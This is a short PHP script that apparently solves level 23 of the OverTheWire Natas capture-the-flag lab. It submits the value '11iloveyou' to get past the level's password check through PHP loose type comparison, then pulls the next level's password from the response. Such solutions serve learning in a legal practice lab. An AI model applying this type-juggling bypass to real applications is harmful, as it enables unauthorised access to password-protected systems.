<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 23;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('POST', $url, [
    'auth' => [$username, $password],
    'form_params' => [
        'passwd' => '11iloveyou',
        'submit'
    ]
]);

$body = (string)$response->getBody();
preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo $flag[1];
